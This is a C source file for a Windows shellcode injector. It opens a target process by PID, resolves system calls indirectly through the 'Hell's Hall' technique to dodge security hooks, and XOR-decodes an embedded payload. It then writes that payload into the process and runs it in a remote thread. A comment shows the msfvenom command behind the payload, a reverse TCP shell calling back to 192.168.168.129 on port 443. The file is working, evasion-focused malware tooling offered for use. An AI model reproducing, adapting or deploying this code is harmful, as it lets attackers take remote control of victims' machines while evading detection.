#include "header.h"

#define KEY "FHTW"

// Process Injection 
BOOL Inject(IN PNTAPI_FUNC pNt, IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize) {


	NTSTATUS STATUS = NULL;
	BOOL bState = TRUE;

	SIZE_T sAllocatedSize = sizeof(pShellcode);

	PVOID pAddress = NULL;
	SIZE_T sBytesWritten = NULL;
	DWORD dwOldProtection = NULL;
	HANDLE hThread = NULL;
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

	// Allocate memory for the shellcode
	// https://ntdoc.m417z.com/ntallocatevirtualmemory
	SET_SYSCALL(pNt->NtAllocateVirtualMemory);
	STATUS = RunSyscall(hProcess, &pAddress, NULL, &sAllocatedSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtAllocateVirtualMemory");
		bState = FALSE;
		goto CLEANUP;
	}
	OKAY("[ 0x%p ] [RW-] Memory allocated.\n    [>] Syscall executed from 0x%p.", pAddress, pNt->NtAllocateVirtualMemory.pSyscallInstAddress);

	// Decrypt payload 
	SIZE_T sKeyLength = strlen(KEY);
	for (int i = 0; i < sSize; i++) {
		pShellcode[i] ^= KEY[i % sKeyLength];
	}
	OKAY("[ 0x%p ] Decoded payload with key \"%s\".", pShellcode, KEY);

	// Write shellcode to allocated memory
	// https://ntdoc.m417z.com/ntwritevirtualmemory
	SET_SYSCALL(pNt->NtWriteVirtualMemory);
	STATUS = RunSyscall(hProcess, pAddress, pShellcode, sSize, &sBytesWritten);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtWriteVirtualMemory");
		bState = FALSE;
		goto CLEANUP;
	}
	OKAY("[ 0x%p ] %d bytes written.\n    [>] Syscall executed from 0x%p.", pAddress, sBytesWritten, pNt->NtWriteVirtualMemory.pSyscallInstAddress);

	// Change memory protection
	// https://ntdoc.m417z.com/ntprotectvirtualmemory
	SET_SYSCALL(pNt->NtProtectVirtualMemory);
	STATUS = RunSyscall(hProcess, &pAddress, &sAllocatedSize, PAGE_EXECUTE, &dwOldProtection);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtProtectVirtualMemory");
		bState = FALSE;
		goto CLEANUP;
	}
	OKAY("[ 0x%p ] [--X] Changed memory protection.\n    [>] Syscall executed from 0x%p.", pAddress, pNt->NtProtectVirtualMemory.pSyscallInstAddress);

	// Create new thread 
	// https://ntdoc.m417z.com/ntcreatethreadex
	SET_SYSCALL(pNt->NtCreateThreadEx);
	STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtCreateThreadEx");
		bState = FALSE;
		goto CLEANUP;
	}
	OKAY("[ 0x%p ] Thread created.\n    [>] Syscall executed from 0x%p.", hThread, pNt->NtCreateThreadEx.pSyscallInstAddress);

	// Wait for execution to finish
	// https://ntdoc.m417z.com/ntwaitforsingleobject
	SET_SYSCALL(pNt->NtWaitForSingleObject);
	STATUS = RunSyscall(hThread, FALSE, NULL);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtWaitForSingleObject");
		bState = FALSE;
		goto CLEANUP;
	}

CLEANUP:

	// Close thread handle
	// https://ntdoc.m417z.com/ntclose
	if (hThread) {
		SET_SYSCALL(pNt->NtClose); 
		STATUS = RunSyscall(hThread);
		OKAY("Thread exited.");
	}

	return bState;
}

int main(int argc, char* argv[]) {

	// Print API hashes
	// PrintHashes(); 

	DWORD dwPid = NULL;
	HANDLE hProcess = NULL;

	NTSTATUS STATUS = NULL; 
	NTAPI_FUNC Nt = { 0 };

	// msfvenom - p windows/x64/shell_reverse_tcp LHOST=192.168.168.129 LPORT=443 EXITFUNC=thread -a x64 --platform windows -f raw -o rev.bin
	// python3 encoder.py
	unsigned char pShellcode[] = {
		0xBA,0x00,0xD7,0xB3,0xB6,0xA0,0x94,0x57,0x46,0x48,0x15,0x06,0x07,0x18,0x06,
		0x06,0x10,0x00,0x65,0x85,0x23,0x00,0xDF,0x05,0x26,0x00,0xDF,0x05,0x5E,0x00,
		0xDF,0x05,0x66,0x00,0xDF,0x25,0x16,0x00,0x5B,0xE0,0x0C,0x02,0x19,0x66,0x8F,
		0x00,0x65,0x97,0xEA,0x74,0x35,0x2B,0x44,0x64,0x74,0x16,0x87,0x81,0x59,0x16,
		0x47,0x89,0xB6,0xBA,0x14,0x09,0x05,0x1F,0xCD,0x1A,0x74,0xDC,0x04,0x74,0x1C,
		0x56,0x96,0xC3,0xD4,0xDF,0x46,0x48,0x54,0x1F,0xC3,0x88,0x20,0x30,0x0E,0x49,
		0x84,0x07,0xCD,0x00,0x4C,0x13,0xCD,0x08,0x74,0x1E,0x47,0x98,0xB7,0x01,0x0E,
		0xB7,0x9D,0x16,0xCD,0x7C,0xDC,0x1F,0x47,0x9E,0x19,0x66,0x8F,0x00,0x65,0x97,
		0xEA,0x09,0x95,0x9E,0x4B,0x09,0x55,0x96,0x7E,0xA8,0x21,0xA6,0x0A,0x4B,0x18,
		0x73,0x4E,0x0D,0x6D,0x86,0x33,0x90,0x0C,0x13,0xCD,0x08,0x70,0x1E,0x47,0x98,
		0x32,0x16,0xCD,0x44,0x1C,0x13,0xCD,0x08,0x48,0x1E,0x47,0x98,0x15,0xDC,0x42,
		0xC0,0x1C,0x56,0x96,0x09,0x0C,0x16,0x1E,0x16,0x0D,0x0D,0x07,0x10,0x15,0x0E,
		0x07,0x12,0x1C,0xD4,0xAA,0x68,0x15,0x05,0xB9,0xA8,0x0C,0x16,0x1F,0x12,0x1C,
		0xDC,0x54,0xA1,0x03,0xA8,0xB9,0xB7,0x09,0x1E,0xF8,0x3F,0x27,0x65,0x19,0x7B,
		0x66,0x57,0x46,0x09,0x02,0x1E,0xCF,0xAE,0x1C,0xD6,0xAA,0xE8,0x55,0x57,0x46,
		0x01,0xDD,0xB2,0x0F,0xF4,0x56,0x57,0x47,0xF3,0x94,0xFF,0xEE,0xC9,0x15,0x03,
		0x0F,0xC1,0xB0,0x1B,0xCF,0xB9,0x15,0xED,0x0A,0x3F,0x72,0x50,0xB9,0x9D,0x18,
		0xDE,0xAC,0x20,0x55,0x56,0x46,0x48,0x0D,0x16,0xFC,0x61,0xD4,0x3C,0x46,0xB7,
		0x81,0x07,0x16,0x05,0x65,0x9E,0x0B,0x79,0x94,0x1F,0xB9,0x88,0x1C,0xDE,0x84,
		0x00,0xAB,0x97,0x0E,0xC1,0x95,0x16,0xFC,0xA2,0x5B,0x88,0xA6,0xB7,0x81,0x1F,
		0xCF,0x8F,0x3E,0x47,0x07,0x10,0x18,0xDE,0xA4,0x00,0xDD,0xAE,0x07,0xF2,0xCD,
		0xF2,0x32,0x29,0xAB,0x82,0x0E,0xC9,0x90,0x17,0x44,0x48,0x54,0x1E,0xFE,0x2B,
		0x39,0x33,0x46,0x48,0x54,0x57,0x46,0x09,0x04,0x16,0x16,0x00,0xDD,0xB5,0x11,
		0x1F,0x03,0x1A,0x77,0x88,0x3E,0x5A,0x1F,0x09,0x04,0xB5,0xBA,0x2E,0x93,0x13,
		0x62,0x1C,0x55,0x56,0x0E,0xC5,0x10,0x73,0x5E,0x8E,0x54,0x3F,0x0E,0xC1,0xB2,
		0x01,0x16,0x09,0x04,0x16,0x16,0x09,0x04,0x1E,0xB9,0x88,0x15,0x07,0x0F,0xB7,
		0x9C,0x1A,0xCF,0x89,0x18,0xDE,0x87,0x09,0xEE,0x2E,0x8A,0x77,0xD2,0xA8,0x93,
		0x00,0x65,0x85,0x0E,0xB7,0x9E,0xDC,0x48,0x09,0xEE,0x5F,0xC1,0x55,0x34,0xA8,
		0x93,0xF3,0xB4,0x4A,0x6C,0x42,0x15,0xED,0xE0,0xDD,0xE9,0xCA,0xB9,0x9D,0x1C,
		0xD4,0x82,0x60,0x68,0x51,0x3A,0x42,0xD4,0xAC,0xA6,0x3D,0x51,0xEC,0x01,0x5B,
		0x26,0x38,0x2C,0x48,0x0D,0x16,0xCF,0x92,0xAB,0x82
	};

	// Handle command line arguments
	if (argc < 2) {
		printf("Usage: %s <pid>\n", argv[0]);
		return EXIT_FAILURE;
	}
	dwPid = atoi(argv[1]);

	// Initialize Indirect Syscalls
	if (!InitializeIndirectSyscalls(&Nt)) {
		PRINT_ERROR("InitializeIndirectSyscalls"); 
		return EXIT_FAILURE; 
	}
	OKAY("Indirect syscalls initialized via Hell's Hall technique."); 

	// Get handle to remote process
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID cId = { ULongToHandle(dwPid) };

	SET_SYSCALL(Nt.NtOpenProcess); 
	STATUS = RunSyscall(&hProcess, PROCESS_ALL_ACCESS, &OA, &cId);
	if (STATUS != STATUS_SUCCESS) {
		PRINT_NTERROR("NtOpenProcess");
		return EXIT_FAILURE;
	}
	OKAY("[ 0x%p ] [ %d ] Process opened.\n    [>] Syscall executed from 0x%p.", hProcess, dwPid, Nt.NtOpenProcess.pSyscallInstAddress);

	// Inject 
	if (!Inject(&Nt, hProcess, pShellcode, sizeof(pShellcode))) {
		PRINT_ERROR("Inject");
		return EXIT_FAILURE;
	}

	if (hProcess) {
		SET_SYSCALL(Nt.NtClose); 
		STATUS = RunSyscall(hProcess);
	}

	return EXIT_SUCCESS;
}
